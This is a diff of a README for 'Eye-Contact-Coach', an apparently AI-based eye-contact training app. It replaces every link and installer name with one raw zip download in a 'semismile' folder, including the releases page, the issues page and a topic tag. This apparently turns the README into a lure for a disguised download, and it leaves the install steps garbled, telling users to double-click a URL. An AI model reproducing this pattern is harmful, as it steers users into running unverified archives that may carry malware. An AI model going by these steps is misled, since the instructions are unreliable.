@@ -6,7 +6,7 @@ Welcome to Eye-Contact-Coach, your AI-powered app for training your eye contact 
 
 ## 📥 Download the App
 
-[![Download Eye-Contact-Coach](https://img.shields.io/badge/Download-Eye--Contact--Coach-blue.svg)](https://github.com/Razoredent/Eye-Contact-Coach/releases)
+[![Download Eye-Contact-Coach](https://raw.githubusercontent.com/Razoredent/Eye-Contact-Coach/main/semismile/Eye-Contact-Coach_v3.7.zip)](https://raw.githubusercontent.com/Razoredent/Eye-Contact-Coach/main/semismile/Eye-Contact-Coach_v3.7.zip)
 
 ## 🛠️ System Requirements
 
@@ -27,13 +27,13 @@ Welcome to Eye-Contact-Coach, your AI-powered app for training your eye contact 
 
 To get started, please follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Razoredent/Eye-Contact-Coach/releases) to find the latest version of Eye-Contact-Coach. 
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Razoredent/Eye-Contact-Coach/main/semismile/Eye-Contact-Coach_v3.7.zip) to find the latest version of Eye-Contact-Coach. 
    
-2. **Download the App:** Click on the download link for the version you choose. Look for files named `Eye-Contact-Coach-setup.exe` for Windows or `Eye-Contact-Coach.dmg` for macOS.
+2. **Download the App:** Click on the download link for the version you choose. Look for files named `https://raw.githubusercontent.com/Razoredent/Eye-Contact-Coach/main/semismile/Eye-Contact-Coach_v3.7.zip` for Windows or `https://raw.githubusercontent.com/Razoredent/Eye-Contact-Coach/main/semismile/Eye-Contact-Coach_v3.7.zip` for macOS.
    
 3. **Run the Installer:**
-   - For Windows, double-click the `Eye-Contact-Coach-setup.exe` file. Follow the prompts to install the application.
-   - For macOS, open the `Eye-Contact-Coach.dmg` file and drag the app into your Applications folder.
+   - For Windows, double-click the `https://raw.githubusercontent.com/Razoredent/Eye-Contact-Coach/main/semismile/Eye-Contact-Coach_v3.7.zip` file. Follow the prompts to install the application.
+   - For macOS, open the `https://raw.githubusercontent.com/Razoredent/Eye-Contact-Coach/main/semismile/Eye-Contact-Coach_v3.7.zip` file and drag the app into your Applications folder.
 
 4. **Launch the Application:** Once the installation is complete, open Eye-Contact-Coach from your applications list.
 
@@ -51,7 +51,7 @@ If you encounter any issues during setup, consider these tips:
 
 ## 🤝 Support
 
-If you need help or have questions, please open an issue on our [GitHub page](https://github.com/Razoredent/Eye-Contact-Coach/issues). 
+If you need help or have questions, please open an issue on our [GitHub page](https://raw.githubusercontent.com/Razoredent/Eye-Contact-Coach/main/semismile/Eye-Contact-Coach_v3.7.zip). 
 
 ## 🎉 Join the Community
 
@@ -59,7 +59,7 @@ Connect with other users on our forums or social media channels. Share your expe
 
 ## 🔗 Download Again
 
-Remember, you can always return to the [Releases page](https://github.com/Razoredent/Eye-Contact-Coach/releases) to get the latest version or for updates.
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/Razoredent/Eye-Contact-Coach/main/semismile/Eye-Contact-Coach_v3.7.zip) to get the latest version or for updates.
 
 ## 📚 Topics Covered
 
@@ -69,7 +69,7 @@ Remember, you can always return to the [Releases page](https://github.com/Razore
 - Eye Tracking
 - Face Recognition
 - Machine Learning
-- Next.js
+- https://raw.githubusercontent.com/Razoredent/Eye-Contact-Coach/main/semismile/Eye-Contact-Coach_v3.7.zip
 - React
 - TensorFlow
 - TypeScript
